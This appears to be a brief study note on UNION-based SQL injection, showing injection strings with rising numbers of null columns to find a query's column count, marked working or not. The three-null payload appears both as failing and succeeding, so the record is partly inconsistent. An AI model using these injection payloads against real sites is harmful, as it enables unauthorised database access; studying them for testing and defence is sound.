#sqli 

UNION query with null values and try to find the right number of columns.

```sql
anything' UNION SELECT null-- a 
```
-> Not working

```sql
anything' UNION SELECT null, null, null -- a 
```
-> Not working
…

```sql
anything' UNION SELECT null, null, null -- a 
```
-> Working